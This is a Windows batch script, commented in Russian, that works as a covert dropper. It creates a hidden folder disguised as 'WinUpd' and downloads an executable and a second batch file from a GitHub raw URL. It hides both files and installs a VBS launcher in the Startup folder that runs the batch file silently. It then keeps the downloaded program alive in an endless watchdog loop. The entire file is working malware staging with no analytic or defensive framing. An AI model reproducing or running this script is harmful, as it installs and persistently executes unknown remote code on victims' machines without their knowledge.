@echo off
setlocal enabledelayedexpansion

rem Основные пути
set "folder=%appdata%\WinUpd"
set "upunion=%folder%\Upunion.exe"
set "jossol=%folder%\jossol.bat"
set "vbsfile=%folder%\run_jossol.vbs"
set "startup_folder=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
set "startup_vbs=%startup_folder%\run_jossol.vbs"

rem Создаем папку, если её нет
if not exist "%folder%" (
    mkdir "%folder%"
    attrib +h +s "%folder%"
)

rem Скачиваем Upunion.exe, если его нет
if not exist "%upunion%" (
    echo Downloading Upunion.exe...
    curl -L -o "%upunion%" "https://raw.githubusercontent.com/poiko34/school/refs/heads/main/Upunion.exe" || (
        echo Failed to download Upunion.exe
        exit /b 1
    )
    attrib +h +s "%upunion%"
)

rem Скачиваем jossol.bat, если его нет
if not exist "%jossol%" (
    echo Downloading jossol.bat...
    curl -L -o "%jossol%" "https://raw.githubusercontent.com/poiko34/school/refs/heads/main/jossol.bat" || (
        echo Failed to download jossol.bat
        exit /b 1
    )
    attrib +h +s "%jossol%"
)

rem Создаем VBS-скрипт для скрытого запуска jossol.bat
(
    echo Set WshShell = CreateObject^("WScript.Shell"^)
    echo WshShell.Run Chr^(34^) ^& "%jossol%" ^& Chr^(34^), 0
    echo Set WshShell = Nothing
) > "%vbsfile%"

rem Копируем VBS в автозагрузку (shell:startup)
if not exist "%startup_folder%" mkdir "%startup_folder%"
copy /y "%vbsfile%" "%startup_vbs%" >nul

rem Запускаем Upunion.exe
start "" "%upunion%"

rem Бесконечный цикл проверки процесса Upunion.exe
:loop
tasklist /FI "IMAGENAME eq Upunion.exe" 2>NUL | find /I "Upunion.exe" >NUL
if %ERRORLEVEL% neq 0 (
    echo Upunion.exe not running. Starting jossol.bat...
    start "" "%jossol%"
)
timeout /t 10 >nul
goto loop
